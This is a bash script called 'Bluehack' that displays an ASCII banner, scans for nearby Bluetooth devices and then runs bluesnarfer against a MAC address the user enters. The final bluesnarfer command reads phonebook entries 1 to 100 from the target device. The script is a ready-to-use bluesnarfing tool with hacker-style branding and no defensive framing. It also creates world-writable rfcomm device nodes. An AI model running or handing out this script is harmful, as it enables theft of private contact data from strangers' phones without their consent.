#!/bin/bash
clear
head() {
printf "\n\e[0;31m┌─[\e[0m\e[1;31mBluehack\e[0m\e[0;31m]─[\e[0m\e[1;32m$hh\e[0m\e[0;31m]\e[0m"
printf "\n\e[0;31m└──╼ $\e[0m "
}
printf "\e[1;92m  #########*   \e[0m\e[1;93m                   #########*\e[0m\n"
printf "\e[1;92m  #  #    #       # \e[0m\e[1;93m               #  #    #  \e[0m\n"
printf "\e[1;92m   # #   #        #\e[0m\e[1;93m                 # #   #\e[0m\n"
printf "\e[1;92m     #  #         #      *\e[0m\e[1;93m            #  #\e[0m\n"
printf "\e[1;92m     # #          #      #\e[0m\e[1;93m            # #              #\e[0m\n"
printf "\e[1;92m     #     ####################\e[0m\e[1;93m       #     ########### \e[0m\n"
printf "\e[1;92m     # #   #      #      #\e[0m\e[1;93m            # #   #      # #     # \e[0m\n"
printf "\e[1;92m     #  #  #      ########\e[0m\e[1;93m            #  #  #      ##    #\e[0m\n"
printf "\e[1;92m     #   # #      #      #\e[0m\e[1;93m            #   # #      # # #\e[0m\n"
printf "\e[1;92m     #    #########      #\e[0m\e[1;93m            #    ############\e[0m\n"
printf "\e[1;92m        #                 \e[0m\e[1;93m               #         #\e[0m\n"
printf "\e[1;92m      #                   \e[0m\e[1;93m             #         #\e[0m\n"
printf "\e[1;92m   *#                     \e[0m\e[1;93m           #         #\e[0m\n\n"
printf "                                                        Access bluetooth\n"
printf "                                                     Made by@:Rocky\n"

printf "\e[1;92m/==========================########========================\\  \e[0m\n"
printf "\e[1;92m|                             #				   |   \e[0m\n"
printf "\e[1;92m|             # Hacking is over vission & mission #        |   \e[0m\n"
printf "\e[1;92m|             	                 		           |   \e[0m\n"
printf "\e[1;92m|         # Tested on Kali Linux, Parrot and BlackArch #   |   \e[0m\n"
printf "\e[1;92m|                     					   |   \e[0m\n"
printf "\e[1;92m|———————————#—————————————————#——————————————————#—————————|   \e[0m\n"
printf "\e[1;92m|                                               Anonymous ||  \e[0m\n"
printf "\e[1;92m\==========================================================/   \e[0m\n"
printf "\n"
sleep 2
hh="Start"
head
sleep 1
mkdir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
mknod --mode=666 /dev/rfcomm0 c 216 0
hciconfig -a hci0 up
hciconfig hci0
hh="Scanning"
head
printf "\e[1;92m	  Mac Address           Device Name\e[0m\n"
timeout 30s hcitool scan
hh="Enter the device mac address"
head
read mac
timeout 5s l2ping $mac
sdptool browse --tree --l2cap $mac >/dev/null
hh="Enter the device mac address again"
head
read rock
printf "\e[1;92m Check your Bluetooth setting\e[0m\n" 
hh="Bluetooth connect"
head
bluesnarfer -r 1-100 -c 6 -b $rock




